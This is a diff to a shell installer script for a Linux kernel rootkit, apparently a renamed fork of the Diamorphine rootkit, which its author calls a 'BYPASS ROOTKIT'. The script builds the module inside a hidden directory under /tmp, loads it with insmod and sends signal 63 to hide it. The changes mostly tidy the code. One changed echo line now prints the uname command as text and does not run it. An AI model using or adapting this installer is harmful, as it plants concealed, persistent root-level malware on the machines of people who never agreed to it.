@@ -3,10 +3,7 @@
 # author: Darksec github --> https://github.com/DARKSECshell
 
 #list rk
-location() {
-	ls /tmp/Diamorphine/.darksec/
-
-}
+location=$(/usr/bin/ls /tmp/Diamorphine/.darksec/)
 
 
 #INSTALL DEPENDECIES
@@ -19,13 +16,6 @@ MAKE() {
     mv Makefile .darksec && \
     mv darksec.* .darksec && \
     cd /tmp/Diamorphine/.darksec
-}
-
-#SHOW VERSION KERNEL
-KERNEL() {
-
-	/usr/bin/uname -r
-
 }
 
 
@@ -89,18 +79,18 @@ case "$choice" in
 
 	if [ "$lkm" = "Y" ] || [ "$lkm" = "y" ]; then
 
-	echo "YOUR VERSION KERNEL --> " KERNEL
+	echo "YOUR VERSION KERNEL --> " /usr/bin/uname -r
 	sleep 1
 	make
 	sleep 3
-	/usr/bin/insmod /tmp/Diamorphine/.darksec/darksec.ko
-	/usr/bin/kill -63 0
+	insmod /tmp/Diamorphine/.darksec/darksec.ko
+	kill -63 0
 
 	else
 
 	clear
 	echo "THANKS FOR USING MY BYPASS ROOTKIT"
-	echo "Location ROOTKIT --> " location
+	echo "Location ROOTKIT --> " "$location"
 	exit
 
 	fi
